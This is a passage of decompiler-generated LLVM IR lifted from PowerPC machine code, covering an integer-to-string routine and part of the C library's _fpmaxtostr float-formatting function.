  br i1 %v4_10007af8, label %dec_label_pc_10007b00, label %dec_label_pc_10007b08

dec_label_pc_10007b00:                            ; preds = %dec_label_pc_10007ae0
  %v1_10007b00 = add i32 %v0_10007af0, 1
  store i32 %v1_10007b00, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007b08

dec_label_pc_10007b08:                            ; preds = %dec_label_pc_10007ae0, %dec_label_pc_10007b00
  %v0_10007b08 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10007b08, i32* %r12.global-to-local, align 4
  %v0_10007b0c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10007b0c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10007b10

dec_label_pc_10007b10thread-pre-split:            ; preds = %dec_label_pc_10007b64
  %v0_10007b10.pr = load i32, i32* %r12.global-to-local, align 4
  %v0_10007b14.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10007b14.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10007b10

dec_label_pc_10007b10:                            ; preds = %dec_label_pc_10007b10thread-pre-split, %dec_label_pc_10007b08
  %v1_10007b58 = phi i32 [ %v1_10007b14.pre, %dec_label_pc_10007b10thread-pre-split ], [ %v1_10007af0, %dec_label_pc_10007b08 ]
  %v1_10007b5c = phi i32 [ %v0_10007b14.pre, %dec_label_pc_10007b10thread-pre-split ], [ %v0_10007b0c, %dec_label_pc_10007b08 ]
  %v1_10007b2c = phi i32 [ %v0_10007b10.pr, %dec_label_pc_10007b10thread-pre-split ], [ %v0_10007b08, %dec_label_pc_10007b08 ]
  %v3_10007b10 = icmp eq i32 %v1_10007b2c, 0
  %v2_10007b14 = udiv i32 %v1_10007b5c, %v1_10007b58
  br i1 %v3_10007b10, label %dec_label_pc_10007b58, label %dec_label_pc_10007b1c

dec_label_pc_10007b1c:                            ; preds = %dec_label_pc_10007b10
  %v2_10007b1c = udiv i32 %v1_10007b2c, %v1_10007b58
  %v2_10007b20 = mul i32 %v2_10007b14, %v1_10007b58
  %v2_10007b24 = mul i32 %v2_10007b1c, %v1_10007b58
  %v2_10007b28 = sub i32 %v1_10007b5c, %v2_10007b20
  %v2_10007b2c = sub i32 %v1_10007b2c, %v2_10007b24
  store i32 %v2_10007b1c, i32* %r12.global-to-local, align 4
  %v0_10007b34 = load i32, i32* %r31.global-to-local, align 4
  %v2_10007b34 = mul i32 %v0_10007b34, %v2_10007b2c
  %v0_10007b38 = load i32, i32* %r8.global-to-local, align 4
  %v2_10007b38 = mul i32 %v0_10007b38, %v2_10007b2c
  %v2_10007b3c = add i32 %v2_10007b34, %v2_10007b28
  %v2_10007b40 = udiv i32 %v2_10007b3c, %v1_10007b58
  %v2_10007b44 = add i32 %v2_10007b38, %v2_10007b14
  %v2_10007b48 = mul i32 %v2_10007b40, %v1_10007b58
  %v2_10007b4c = add i32 %v2_10007b40, %v2_10007b44
  store i32 %v2_10007b4c, i32* %r11.global-to-local, align 4
  %v2_10007b50 = sub i32 %v2_10007b3c, %v2_10007b48
  store i32 %v2_10007b50, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10007b64

dec_label_pc_10007b58:                            ; preds = %dec_label_pc_10007b10
  %v2_10007b58 = mul i32 %v2_10007b14, %v1_10007b58
  %v2_10007b5c = sub i32 %v1_10007b5c, %v2_10007b58
  store i32 %v2_10007b5c, i32* %r5.global-to-local, align 4
  store i32 %v2_10007b14, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10007b64

dec_label_pc_10007b64:                            ; preds = %dec_label_pc_10007b1c, %dec_label_pc_10007b58
  %v1_10007b6c = phi i32 [ %v2_10007b1c, %dec_label_pc_10007b1c ], [ 0, %dec_label_pc_10007b58 ]
  %v0_10007b6c = phi i32 [ %v2_10007b4c, %dec_label_pc_10007b1c ], [ %v2_10007b14, %dec_label_pc_10007b58 ]
  %v0_10007b70 = phi i32 [ %v2_10007b50, %dec_label_pc_10007b1c ], [ %v2_10007b5c, %dec_label_pc_10007b58 ]
  %v1_10007b68 = load i32, i32* %r30.global-to-local, align 4
  %v2_10007b6c = or i32 %v0_10007b6c, %v1_10007b6c
  %v5_10007b6c = icmp eq i32 %v2_10007b6c, 0
  store i1 %v5_10007b6c, i1* %cr0_eq.global-to-local, align 1
  %v0_10007b74 = load i32, i32* %r3.global-to-local, align 4
  %v1_10007b74 = add i32 %v0_10007b74, -1
  store i32 %v1_10007b74, i32* %r3.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_10007b70, 10
  %v1_10007b70.v2_10007b68.v = select i1 %tmp15, i32 48, i32 %v1_10007b68
  %v1_10007b70.v2_10007b68 = add i32 %v0_10007b70, %v1_10007b70.v2_10007b68.v
  %extract.t10.extract.t = trunc i32 %v1_10007b70.v2_10007b68 to i8
  %v3_10007b84 = inttoptr i32 %v1_10007b74 to i8*
  store i8 %extract.t10.extract.t, i8* %v3_10007b84, align 1
  %v0_10007b88 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10007b88, label %dec_label_pc_10007b8c, label %dec_label_pc_10007b10thread-pre-split

dec_label_pc_10007b8c:                            ; preds = %dec_label_pc_10007b64
  %v0_10007b8c = load i32, i32* @r29, align 4
  %v3_10007b8c = icmp eq i32 %v0_10007b8c, 0
  br i1 %v3_10007b8c, label %dec_label_pc_10007b8c.dec_label_pc_10007b9c_crit_edge, label %dec_label_pc_10007b94

dec_label_pc_10007b8c.dec_label_pc_10007b9c_crit_edge: ; preds = %dec_label_pc_10007b8c
  %v0_10007ba4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007b9c

dec_label_pc_10007b94:                            ; preds = %dec_label_pc_10007b8c
  %v2_10007b98 = load i32, i32* %r3.global-to-local, align 4
  %v3_10007b98 = add i32 %v2_10007b98, -1
  %v4_10007b98 = inttoptr i32 %v3_10007b98 to i8*
  store i8 45, i8* %v4_10007b98, align 1
  store i32 %v3_10007b98, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007b9c

dec_label_pc_10007b9c:                            ; preds = %dec_label_pc_10007b8c.dec_label_pc_10007b9c_crit_edge, %dec_label_pc_10007b94
  %v0_10007ba4 = phi i32 [ %v0_10007ba4.pre, %dec_label_pc_10007b8c.dec_label_pc_10007b9c_crit_edge ], [ %v3_10007b98, %dec_label_pc_10007b94 ]
  ret i32 %v0_10007ba4

; uselistorder directives
  uselistorder i32 %v2_10007b40, { 1, 0 }
  uselistorder i32 %v2_10007b1c, { 1, 2, 0 }
  uselistorder i32 %v2_10007b14, { 3, 4, 0, 1, 2 }
  uselistorder i32 %v1_10007b58, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 %v1_10007af0, { 1, 2, 0 }
  uselistorder i32 %v0_10007af0, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 4, 3, 6, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i8 45, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007b9c, { 1, 0 }
  uselistorder label %dec_label_pc_10007b64, { 1, 0 }
  uselistorder label %dec_label_pc_10007b08, { 1, 0 }
  uselistorder label %dec_label_pc_10007ae0, { 2, 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr6_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-200 = alloca i8, align 1
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-179 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-177 = alloca i32, align 4
  %stack_var_-159 = alloca i32, align 4
  %stack_var_-178 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_10007bac = load i32, i32* @lr, align 4
  store i32 101, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 %arg3, i32* @r26, align 4
  %v1_10007bc8 = add i32 %tmp, 11
  %v2_10007bc8 = inttoptr i32 %v1_10007bc8 to i8*
  %v3_10007bc8 = load i8, i8* %v2_10007bc8, align 1
  %v4_10007bc8 = zext i8 %v3_10007bc8 to i32
  store i32 %v4_10007bc8, i32* %r31.global-to-local, align 4
  %v1_10007bd0 = or i32 %v4_10007bc8, 32
  store i32 %v1_10007bd0, i32* %r0.global-to-local, align 4
  %v1_10007bd4 = icmp ult i32 %v1_10007bd0, 97
  %v3_10007bd4 = icmp eq i32 %v1_10007bd0, 97
  store i1 %v1_10007bd4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007bd4, i1* %cr7_eq.global-to-local, align 1
  %v1_10007bd8 = add i32 %tmp, 4
  %v2_10007bd8 = inttoptr i32 %v1_10007bd8 to i32*
  %v3_10007bd8 = load i32, i32* %v2_10007bd8, align 4
  store i32 %v3_10007bd8, i32* %r28.global-to-local, align 4
  %v2_10007bdc = load i32, i32* %arg2, align 4
  store i32 %v2_10007bdc, i32* %r30.global-to-local, align 4
  br i1 %v3_10007bd4, label %dec_label_pc_10007be4, label %dec_label_pc_10007bec

dec_label_pc_10007be4:                            ; preds = %entry
  %v1_10007be4 = add nuw nsw i32 %v4_10007bc8, 6
  store i32 %v1_10007be4, i32* %r0.global-to-local, align 4
  %v1_10007be8 = urem i32 %v1_10007be4, 256
  store i32 %v1_10007be8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007bec

dec_label_pc_10007bec:                            ; preds = %entry, %dec_label_pc_10007be4
  %v0_10007ca4 = phi i32 [ %v4_10007bc8, %entry ], [ %v1_10007be8, %dec_label_pc_10007be4 ]
  %v1_10007bec = icmp slt i32 %v2_10007bdc, 0
  %v3_10007bec = icmp eq i32 %v2_10007bdc, 0
  store i1 %v1_10007bec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007bec, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp sgt i32 %v2_10007bdc, -1
  br i1 %tmp75, label %dec_label_pc_10007bf8, label %dec_label_pc_10007bf4

dec_label_pc_10007bf4:                            ; preds = %dec_label_pc_10007bec
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10007bf8

dec_label_pc_10007bf8:                            ; preds = %dec_label_pc_10007bec, %dec_label_pc_10007bf4
  %v0_10007db044 = phi i32 [ %v2_10007bdc, %dec_label_pc_10007bec ], [ 6, %dec_label_pc_10007bf4 ]
  %v1_10007bf8 = add i32 %tmp, 12
  %v2_10007bf8 = inttoptr i32 %v1_10007bf8 to i32*
  %v3_10007bf8 = load i32, i32* %v2_10007bf8, align 4
  store i32 %v3_10007bf8, i32* %r9.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  %v1_10007c04 = and i32 %v3_10007bf8, 2
  store i32 %v1_10007c04, i32* %r0.global-to-local, align 4
  %v3_10007c04 = icmp eq i32 %v1_10007c04, 0
  br i1 %v3_10007c04, label %dec_label_pc_10007c14, label %dec_label_pc_10007c20

dec_label_pc_10007c14:                            ; preds = %dec_label_pc_10007bf8
  %v1_10007c14 = urem i32 %v3_10007bf8, 2
  store i32 %v1_10007c14, i32* @r7, align 4
  %v3_10007c14 = icmp eq i32 %v1_10007c14, 0
  br i1 %v3_10007c14, label %dec_label_pc_10007c24, label %dec_label_pc_10007c20

dec_label_pc_10007c20:                            ; preds = %dec_label_pc_10007c14, %dec_label_pc_10007bf8
  %storemerge = phi i32 [ 43, %dec_label_pc_10007bf8 ], [ 32, %dec_label_pc_10007c14 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_10007c20 = trunc i32 %storemerge to i8
  store i8 %v6_10007c20, i8* %stack_var_-200, align 1
  br label %dec_label_pc_10007c24

dec_label_pc_10007c24:                            ; preds = %dec_label_pc_10007c14, %dec_label_pc_10007c20
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10007bec, label %dec_label_pc_10007d88, label %dec_label_pc_10007ca0

dec_label_pc_10007ca0:                            ; preds = %dec_label_pc_10007c24
  %v1_10007ca4 = icmp ult i32 %v0_10007ca4, 96
  %v2_10007ca4 = icmp ugt i32 %v0_10007ca4, 96
  %v3_10007ca4 = icmp eq i32 %v0_10007ca4, 96
  store i1 %v1_10007ca4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007ca4, i1* %cr7_eq.global-to-local, align 1
  %v2_10007ca8 = add i32 %tmp, 16
  %v3_10007ca8 = inttoptr i32 %v2_10007ca8 to i32*
  store i32 32, i32* %v3_10007ca8, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_10007ca4, label %dec_label_pc_10007ccc, label %dec_label_pc_10007cc0

dec_label_pc_10007cc0:                            ; preds = %dec_label_pc_10007ca0
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10007ccc

dec_label_pc_10007ccc:                            ; preds = %dec_label_pc_10007ca0, %dec_label_pc_10007cc0
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_1000cf50.431 to i32), i32 8), %dec_label_pc_10007ca0 ], [ add (i32 ptrtoint ([4 x i8]* @global_var_1000cf50.431 to i32), i32 12), %dec_label_pc_10007cc0 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1000cf50.431 to i32), i32* %r9.global-to-local, align 4
  %v2_10007cd8 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10007cd8, i32* %r8.global-to-local, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008178

dec_label_pc_10007d88:                            ; preds = %dec_label_pc_10007c24
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10007d8c = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10007d8c, i32* %r6.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_10007dd8 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_10007dac

dec_label_pc_10007dac:                            ; preds = %dec_label_pc_10007e2c.dec_label_pc_10007dac_crit_edge, %dec_label_pc_10007d88
  %v0_10007db0 = phi i32 [ %v0_10007db0.pre, %dec_label_pc_10007e2c.dec_label_pc_10007dac_crit_edge ], [ %v0_10007db044, %dec_label_pc_10007d88 ]
  %v3_10007db0 = call %1 @__asm_cror(i32 %v0_10007db0, i32 %tmp, i32 %v0_10007db0)
  %v0_10007db4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007db4, label %dec_label_pc_10007dc8, label %dec_label_pc_10007ddc

dec_label_pc_10007dc8:                            ; preds = %dec_label_pc_10007dac
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007ddc

dec_label_pc_10007ddc:                            ; preds = %dec_label_pc_10007dac, %dec_label_pc_10007dc8
  %storemerge2 = phi i32 [ %v1_10007dd8, %dec_label_pc_10007dc8 ], [ %tmp55, %dec_label_pc_10007dac ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_10007dec = load i32, i32* %r6.global-to-local, align 4
  %v1_10007dec = add i32 %v0_10007dec, 9
  store i32 %v1_10007dec, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10007e08

dec_label_pc_10007e08:                            ; preds = %dec_label_pc_10007e08.dec_label_pc_10007e08_crit_edge, %dec_label_pc_10007ddc
  %v1_10007e10 = phi i32 [ %v1_10007e10.pre, %dec_label_pc_10007e08.dec_label_pc_10007e08_crit_edge ], [ %v1_10007dec, %dec_label_pc_10007ddc ]
  %v0_10007e0c = phi i32 [ %v0_10007e0c.pre, %dec_label_pc_10007e08.dec_label_pc_10007e08_crit_edge ], [ 0, %dec_label_pc_10007ddc ]
  %v1_10007e08 = phi i32 [ %v1_10007e08.pre, %dec_label_pc_10007e08.dec_label_pc_10007e08_crit_edge ], [ 10, %dec_label_pc_10007ddc ]
  %v1_10007e18 = phi i32 [ %v0_10007e08.pre, %dec_label_pc_10007e08.dec_label_pc_10007e08_crit_edge ], [ %storemerge2, %dec_label_pc_10007ddc ]
  %v2_10007e08 = udiv i32 %v1_10007e18, %v1_10007e08
  store i32 %v2_10007e08, i32* %r0.global-to-local, align 4
  %v1_10007e0c = add i32 %v0_10007e0c, 1
  store i32 %v1_10007e0c, i32* %r8.global-to-local, align 4
  %v2_10007e10 = sub i32 %v1_10007e10, %v1_10007e0c
  store i32 %v2_10007e10, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_10007e08, -10
  store i32 %v2_10007e08, i32* %r10.global-to-local, align 4
  %v2_10007e18 = add i32 %v1_10007e18, 48
  %v1_10007e20 = add i32 %v2_10007e18, %tmp76
  store i32 %v1_10007e20, i32* %r9.global-to-local, align 4
  %v1_10007e24 = trunc i32 %v1_10007e20 to i8
  %v3_10007e24 = inttoptr i32 %v2_10007e10 to i8*
  store i8 %v1_10007e24, i8* %v3_10007e24, align 1
  %v0_10007e28 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10007e28 = add i32 %v0_10007e28, -1
  store i32 %v1_10007e28, i32* %ctr.global-to-local, align 4
  %v2_10007e28 = icmp eq i32 %v1_10007e28, 0
  br i1 %v2_10007e28, label %dec_label_pc_10007e2c, label %dec_label_pc_10007e08.dec_label_pc_10007e08_crit_edge

dec_label_pc_10007e08.dec_label_pc_10007e08_crit_edge: ; preds = %dec_label_pc_10007e08
  %v0_10007e08.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10007e08.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10007e0c.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10007e10.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10007e08

dec_label_pc_10007e2c:                            ; preds = %dec_label_pc_10007e08
  %v0_10007e2c = load i32, i32* %r7.global-to-local, align 4
  %v1_10007e2c = icmp slt i32 %v0_10007e2c, 0
  %v3_10007e2c = icmp eq i32 %v0_10007e2c, 0
  store i1 %v1_10007e2c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e2c, i1* %cr7_eq.global-to-local, align 1
  %v1_10007e30 = add i32 %v0_10007e2c, 1
  store i32 %v1_10007e30, i32* %r7.global-to-local, align 4
  br i1 %v3_10007e2c, label %dec_label_pc_10007e2c.dec_label_pc_10007dac_crit_edge, label %dec_label_pc_10007e38

dec_label_pc_10007e2c.dec_label_pc_10007dac_crit_edge: ; preds = %dec_label_pc_10007e2c
  %v0_10007db0.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10007dac

dec_label_pc_10007e38:                            ; preds = %dec_label_pc_10007e2c
  %v0_10007e38 = load i32, i32* %r31.global-to-local, align 4
  %v1_10007e38 = icmp ult i32 %v0_10007e38, 96
  %v2_10007e38 = icmp ugt i32 %v0_10007e38, 96
  %v3_10007e38 = icmp eq i32 %v0_10007e38, 96
  store i1 %v1_10007e38, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e38, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10007e38, label %dec_label_pc_10007e50, label %dec_label_pc_10007e40

dec_label_pc_10007e40:                            ; preds = %dec_label_pc_10007e38
  %v1_10007e48 = add i32 %v0_10007e38, 32
  store i32 %v1_10007e48, i32* %r0.global-to-local, align 4
  %v1_10007e4c = urem i32 %v1_10007e48, 256
  store i32 %v1_10007e4c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10007e50

dec_label_pc_10007e50:                            ; preds = %dec_label_pc_10007e38, %dec_label_pc_10007e40
  %v0_10007e68 = phi i32 [ %v1_10007e4c, %dec_label_pc_10007e40 ], [ %v0_10007e38, %dec_label_pc_10007e38 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_10007e40 ], [ 101, %dec_label_pc_10007e38 ]
  %v1_10007e50 = icmp slt i32 %v0_10007e68, 103
  %v3_10007e50 = icmp eq i32 %v0_10007e68, 103
  store i1 %v1_10007e50, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e50, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007e50, label %dec_label_pc_10007e58, label %dec_label_pc_10007e68

dec_label_pc_10007e58:                            ; preds = %dec_label_pc_10007e50
  %v0_10007e58 = load i32, i32* %r30.global-to-local, align 4
  %v1_10007e58 = icmp slt i32 %v0_10007e58, 0
  %v3_10007e58 = icmp eq i32 %v0_10007e58, 0
  store i1 %v1_10007e58, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e58, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007e58, label %dec_label_pc_10007e70, label %dec_label_pc_10007e60

dec_label_pc_10007e60:                            ; preds = %dec_label_pc_10007e58
  %v1_10007e60 = add i32 %v0_10007e58, -1
  store i32 %v1_10007e60, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10007e70

dec_label_pc_10007e68:                            ; preds = %dec_label_pc_10007e50
  %v1_10007e68 = icmp slt i32 %v0_10007e68, 102
  %v3_10007e68 = icmp eq i32 %v0_10007e68, 102
  store i1 %v1_10007e68, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e68, i1* %cr7_eq.global-to-local, align 1
  %v0_10007e78 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_10007e68, label %dec_label_pc_10007e78, label %dec_label_pc_10007e70

dec_label_pc_10007e70:                            ; preds = %dec_label_pc_10007e68, %dec_label_pc_10007e58, %dec_label_pc_10007e60
  %v0_10007e70 = phi i32 [ 0, %dec_label_pc_10007e58 ], [ %v1_10007e60, %dec_label_pc_10007e60 ], [ %v0_10007e78, %dec_label_pc_10007e68 ]
  store i32 %v0_10007e70, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007e9c

dec_label_pc_10007e78:                            ; preds = %dec_label_pc_10007e68
  %v1_10007e78 = load i32, i32* %r5.global-to-local, align 4
  %v2_10007e78 = add i32 %v1_10007e78, %v0_10007e78
  store i32 %v2_10007e78, i32* %r10.global-to-local, align 4
  %v1_10007e7c = icmp slt i32 %v2_10007e78, -1
  %v3_10007e7c = icmp eq i32 %v2_10007e78, -1
  store i1 %v1_10007e7c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007e7c, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_10007e78, -2
  br i1 %tmp77, label %dec_label_pc_10007e9c, label %dec_label_pc_10007e84

dec_label_pc_10007e84:                            ; preds = %dec_label_pc_10007e78
  store i32 17, i32* %r5.global-to-local, align 4
  %v2_10007e88 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_10007e88, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r4.global-to-local, align 4
  store i32 268467860, i32* @lr, align 4
  %v3_10007e90 = call i32 @__GI_memset(i32 %v2_10007e88, i32 48, i32 17)
  store i32 %v3_10007e90, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10007e9c

dec_label_pc_10007e9c:                            ; preds = %dec_label_pc_10007e78, %dec_label_pc_10007e70, %dec_label_pc_10007e84
  %v1_10007ec0 = phi i32 [ %v2_10007e78, %dec_label_pc_10007e78 ], [ %v0_10007e70, %dec_label_pc_10007e70 ], [ -1, %dec_label_pc_10007e84 ]
  %v1_10007ea0 = icmp slt i32 %v1_10007ec0, 16
  %v2_10007ea0 = icmp sgt i32 %v1_10007ec0, 16
  %v3_10007ea0 = icmp eq i32 %v1_10007ec0, 16
  store i1 %v1_10007ea0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007ea0, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_10007eb0 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_10007eb0, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_10007ea0, label %dec_label_pc_10007ed8, label %dec_label_pc_10007ebc

dec_label_pc_10007ebc:                            ; preds = %dec_label_pc_10007e9c
  %v2_10007ebc = ptrtoint i32* %stack_var_-177 to i32
  %v2_10007ec0 = add i32 %v1_10007ec0, %v2_10007ebc
  store i32 %v2_10007ec0, i32* %r9.global-to-local, align 4
  %v1_10007ec4 = add i32 %v2_10007ec0, 2
  %v2_10007ec4 = inttoptr i32 %v1_10007ec4 to i8*
  %v3_10007ec4 = load i8, i8* %v2_10007ec4, align 1
  %v4_10007ec4 = zext i8 %v3_10007ec4 to i32
  store i32 %v4_10007ec4, i32* %r0.global-to-local, align 4
  store i32 %v1_10007ec4, i32* %r11.global-to-local, align 4
  %v1_10007ecc = sub nsw i32 52, %v4_10007ec4
  %v2_10007ecc = sub nuw nsw i32 -1, %v4_10007ec4
  %not.v5_10007ecc = icmp ugt i32 %v1_10007ecc, %v2_10007ecc
  %v1_10007ed4 = zext i1 %not.v5_10007ecc to i32
  store i32 %v1_10007ed4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10007ed8

dec_label_pc_10007ed8:                            ; preds = %dec_label_pc_10007e9c, %dec_label_pc_10007ebc, %dec_label_pc_10007ed8.backedge
  %v0_10007edc = phi i32 [ %v0_10007edc.pre, %dec_label_pc_10007ed8.backedge ], [ 0, %dec_label_pc_10007e9c ], [ %v1_10007ed4, %dec_label_pc_10007ebc ]
  %v0_10007ed8 = phi i32 [ %v0_10007ed8.pre, %dec_label_pc_10007ed8.backedge ], [ %v2_10007eb0, %dec_label_pc_10007e9c ], [ %v1_10007ec4, %dec_label_pc_10007ebc ]
  %v1_10007ed8 = add i32 %v0_10007ed8, -1
  %v2_10007ed8 = inttoptr i32 %v1_10007ed8 to i8*
  %v3_10007ed8 = load i8, i8* %v2_10007ed8, align 1
  %v4_10007ed8 = zext i8 %v3_10007ed8 to i32
  store i32 %v1_10007ed8, i32* %r11.global-to-local, align 4
  %v2_10007edc = add i32 %v4_10007ed8, %v0_10007edc
  store i32 %v2_10007edc, i32* %r0.global-to-local, align 4
  %v1_10007ee0 = urem i32 %v2_10007edc, 256
  store i32 %v1_10007ee0, i32* %r9.global-to-local, align 4
  %v1_10007ee4 = trunc i32 %v2_10007edc to i8
  store i8 %v1_10007ee4, i8* %v2_10007ed8, align 1
  %v0_10007ee8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007ee8 = icmp slt i32 %v0_10007ee8, 48
  %v3_10007ee8 = icmp eq i32 %v0_10007ee8, 48
  store i1 %v1_10007ee8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007ee8, i1* %cr7_eq.global-to-local, align 1
  %v1_10007eec = icmp ult i32 %v0_10007ee8, 57
  %v2_10007eec = icmp ugt i32 %v0_10007ee8, 57
  %v3_10007eec = icmp eq i32 %v0_10007ee8, 57
  store i1 %v1_10007eec, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10007eec, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10007eec, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10007ee8, %v2_10007eec
  br i1 %brmerge, label %dec_label_pc_10007ed8.backedge, label %dec_label_pc_10007ef8

dec_label_pc_10007ed8.backedge:                   ; preds = %dec_label_pc_10007ed8
  %v0_10007ed8.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10007edc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10007ed8

dec_label_pc_10007ef8:                            ; preds = %dec_label_pc_10007ed8
  %v2_10007ef8 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_10007ef8, i32* %r0.global-to-local, align 4
  %v0_10007efc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10007efc, i32* @r7, align 4
  %v0_10007f00 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007f00 = icmp ult i32 %v0_10007f00, %v2_10007ef8
